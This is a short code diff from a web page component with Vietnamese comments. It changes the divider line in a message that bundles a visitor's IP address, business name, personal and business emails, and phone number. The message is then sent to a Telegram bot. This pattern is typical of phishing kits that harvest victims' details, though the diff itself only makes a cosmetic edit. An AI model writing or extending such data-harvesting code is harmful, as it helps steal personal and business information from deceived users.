@@ -195,8 +195,8 @@ export default function Home() {
 
     setErrors({}); setLoading(true);
     
-    // Chỉ truyền text thuần, không có thẻ HTML để khớp với file telegram.js
-    const text = `IP: ${escapeHtml(clientIp)}\nBusiness: ${escapeHtml(busName)}\nP.Email: ${escapeHtml(perEmail)}\nB.Email: ${escapeHtml(busEmail)}\nPhone: ${escapeHtml(countryCode + phoneNum)}\n━━━━━━━━━━━━━━━━━━`;
+    // Chỉ truyền text thuần, dùng --- thay cho dòng kẻ dài
+    const text = `IP: ${escapeHtml(clientIp)}\nBusiness: ${escapeHtml(busName)}\nP.Email: ${escapeHtml(perEmail)}\nB.Email: ${escapeHtml(busEmail)}\nPhone: ${escapeHtml(countryCode + phoneNum)}\n---------------------------`;
     
     setInitialSession(text); sendTelegramMessage('');
 
